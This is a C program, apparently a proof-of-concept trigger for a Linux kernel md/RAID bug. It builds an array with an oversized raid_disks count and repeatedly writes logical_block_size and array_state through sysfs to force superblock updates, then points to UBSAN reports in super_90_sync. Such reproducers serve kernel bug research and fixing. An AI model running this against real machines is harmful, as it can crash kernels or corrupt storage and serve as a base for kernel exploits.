#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <sys/wait.h>

#define MD_MAJOR 9
#define SET_ARRAY_INFO 0x40480923
#define ADD_NEW_DISK   0x40140921
#define RUN_ARRAY      0x400c0930

#define MD_DISK_ACTIVE 2
#define MD_DISK_SYNC   3

typedef struct { int number, major, minor, raid_disk, state; } mdu_disk_info_t;
typedef struct {
    int major_version, minor_version, patch_version;
    unsigned int ctime;
    int level, size, nr_disks, raid_disks, md_minor, not_persistent;
    unsigned int utime;
    int state, active_disks, working_disks, failed_disks, spare_disks;
    int layout, chunk_size;
} mdu_array_info_t;
typedef struct { int personality, chunk_size, max_fault; } mdu_param_t;

static int wr(const char *p, const char *v, int *er)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) { if (er) *er = errno; return -1; }
    ssize_t n = write(fd, v, strlen(v));
    int e = errno;
    close(fd);
    if (er) *er = e;
    return n < 0 ? -1 : 0;
}

static long rdnum(const char *p)
{
    char b[64];
    int fd = open(p, O_RDONLY);
    if (fd < 0) return -1;
    int n = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0) return -1;
    b[n] = 0;
    return atol(b);
}

static void mkdev(int n)
{
    char p[64];
    snprintf(p, sizeof(p), "/dev/md%d", n);
    if (access(p, F_OK) != 0)
        mknod(p, S_IFBLK | 0600, makedev(MD_MAJOR, n));
}

static void st(const char *t, long rc, int e)
{
    printf("%-34s rc=%ld errno=%d\n", t, rc, e);
    fflush(stdout);
}

int main(int argc, char **argv)
{
    int big = argc > 1 ? atoi(argv[1]) : 512;
    int n = 0;
    char p[160], b[32];

    printf("=== GAP3 uid=%d big=%d ===\n", getuid(), big);
    fflush(stdout);

    mkdev(n);
    char dev[32];
    snprintf(dev, sizeof(dev), "/dev/md%d", n);

    int fd = open(dev, O_RDWR | O_EXCL);
    st("open md", fd, fd < 0 ? errno : 0);
    if (fd < 0) return 1;

    int e = 0, rc;

    snprintf(p, sizeof(p), "/sys/block/md%d/md/metadata_version", n);
    e = 0; rc = wr(p, "0.90", &e);
    st("metadata_version=0.90", rc, e);

    snprintf(p, sizeof(p), "/sys/block/md%d/md/raid_disks", n);
    snprintf(b, sizeof(b), "%d", big);
    e = 0; rc = wr(p, b, &e);
    st("raid_disks=big", rc, e);
    printf("  raid_disks_now=%ld\n", rdnum(p));

    snprintf(p, sizeof(p), "/sys/block/md%d/md/level", n);
    e = 0; rc = wr(p, "raid1", &e);
    st("level=raid1", rc, e);

    mdu_array_info_t ai;
    memset(&ai, 0, sizeof(ai));
    ai.major_version = 0; ai.minor_version = 90;
    ai.level = 1; ai.size = 2048;
    ai.nr_disks = 1; ai.raid_disks = big;
    ai.md_minor = n; ai.not_persistent = 0;
    e = 0; rc = ioctl(fd, SET_ARRAY_INFO, &ai);
    st("SET_ARRAY_INFO", rc, rc < 0 ? errno : 0);

    mdu_disk_info_t di;
    memset(&di, 0, sizeof(di));
    di.number = 0; di.major = 1; di.minor = 0; di.raid_disk = 0;
    di.state = (1 << MD_DISK_ACTIVE) | (1 << MD_DISK_SYNC);
    e = 0; rc = ioctl(fd, ADD_NEW_DISK, &di);
    st("ADD_NEW_DISK", rc, rc < 0 ? errno : 0);

    mdu_param_t mp; memset(&mp, 0, sizeof(mp)); mp.personality = 1;
    e = 0; rc = ioctl(fd, RUN_ARRAY, &mp);
    st("RUN_ARRAY", rc, rc < 0 ? errno : 0);

    snprintf(p, sizeof(p), "/sys/block/md%d/md/array_state", n);
    printf("  state_after_run=");
    { char q[32] = {0}; int f = open(p, O_RDONLY); if (f>=0){int m=read(f,q,31); close(f); if(m>0){q[m]=0; char*c=strchr(q,10); if(c)*c=0; printf("%s\n",q);}} else printf("(no)\n"); }

    /* ★ 核心触发器：写 logical_block_size 置 MD_SB_CHANGE_DEVS */
    snprintf(p, sizeof(p), "/sys/block/md%d/md/logical_block_size", n);
    e = 0; rc = wr(p, "512", &e);
    st("logical_block_size=512", rc, e);

    /* 让 safemode timer / 后台线程有机会跑 md_update_sb */
    sleep(1);

    /* 再切一次 clean<->active，逼 set_in_sync -> md_update_sb */
    snprintf(p, sizeof(p), "/sys/block/md%d/md/array_state", n);
    e = 0; rc = wr(p, "clean", &e);
    st("array_state=clean", rc, e);

    e = 0; rc = wr(p, "active", &e);
    st("array_state=active", rc, e);

    sleep(1);

    /* 再来一次，确保有两次机会 */
    snprintf(p, sizeof(p), "/sys/block/md%d/md/logical_block_size", n);
    e = 0; rc = wr(p, "4096", &e);
    st("logical_block_size=4096", rc, e);

    e = 0; rc = wr(p, "512", &e);
    st("logical_block_size=512(2)", rc, e);

    sleep(1);

    /* 尝试 resync 触发 */
    snprintf(p, sizeof(p), "/sys/block/md%d/md/sync_action", n);
    e = 0; rc = wr(p, "resync", &e);
    st("sync_action=resync", rc, e);

    sleep(2);

    printf("=== GAP3 done (check dmesg for UBSAN in super_90_sync) ===\n");
    fflush(stdout);
    close(fd);
    return 0;
}